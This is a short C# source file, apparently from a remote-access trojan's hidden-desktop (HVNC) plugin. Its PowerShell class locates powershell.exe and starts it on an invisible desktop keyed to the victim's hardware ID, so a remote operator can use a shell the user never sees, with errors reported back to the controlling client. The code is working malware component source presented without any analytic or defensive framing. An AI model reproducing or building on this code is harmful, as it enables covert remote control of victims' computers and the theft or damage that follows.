using System;
using System.IO;
using System.Threading;

namespace Plugin.Helper.OpenApp;

internal class PowerShell
{
	private static readonly string fileNamePowerShell = Environment.GetFolderPath(Environment.SpecialFolder.System) + "\\WindowsPowerShell\\v1.0\\powershell.exe";

	public static void Open()
	{
		try
		{
			if (File.Exists(fileNamePowerShell))
			{
				HideDesktop.CreateProcess(fileNamePowerShell, Plugin.hwid, bAppName: false);
				Thread.Sleep(3000);
				HideDesktop.Load(Plugin.HVNCDesktop);
			}
		}
		catch (Exception ex)
		{
			Client.Error("PowerShell: " + ex.Message);
		}
	}
}
